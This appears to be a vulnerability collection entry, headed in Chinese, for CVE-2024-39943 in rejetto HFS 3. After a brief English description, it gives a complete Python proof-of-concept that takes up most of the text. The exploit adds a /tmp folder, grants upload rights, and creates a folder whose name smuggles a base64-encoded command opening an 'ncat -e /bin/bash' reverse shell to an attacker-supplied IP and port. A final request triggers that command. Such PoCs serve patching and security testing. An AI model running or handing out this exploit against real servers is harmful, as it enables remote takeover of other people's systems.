## rejetto-HFS-3存在远程命令执行漏洞(CVE-2024-39943)

CVE-2024-39943 rejetto HFS (aka HTTP File Server) 3 before 0.52.10 on Linux, UNIX, and macOS allows OS command execution by remote authenticated users (if they have Upload permissions). This occurs because a shell is used to execute df (i.e., with execSync instead of spawnSync in child_process in Node.js).

## poc

```python
import requests as req
import base64

url = input("Url: ")
cookie = input("Cookie: ")
ip = input("Ip: ")
port = input("Port: ")

headers = {"x-hfs-anti-csrf":"1","Cookie":cookie}

print("Step 1 add vfs")
step1 = req.post(url+"~/api/add_vfs", headers=headers, json={"parent":"/","source":"/tmp"})

print("Step 2 set permission vfs")
step2 = req.post(url+"~/api/set_vfs", headers=headers, json={"uri":"/tmp/","props":{"can_see":None,"can_read":None,"can_list":None,"can_upload":"*","can_delete":None,"can_archive":None,"source":"/tmp","name":"tmp","type":"folder","masks":None}})

print("Step 3 create folder")
command = "ncat {0} {1} -e /bin/bash".format(ip,port)
command = command.encode('utf-8')
payload = 'poc";python3 -c "import os;import base64;os.system(base64.b64decode(\''+base64.b64encode(command).decode('utf-8')+"'))"
step3 = req.post(url+"~/api/create_folder", headers=headers, json={"uri":"/tmp/","name":payload})

print("Step 4 execute payload")
step4 = req.get(url+"~/api/get_ls?path=/tmp/"+payload, headers=headers)
```

## 漏洞来源

- https://github.com/truonghuuphuc/CVE-2024-39943-Poc/tree/main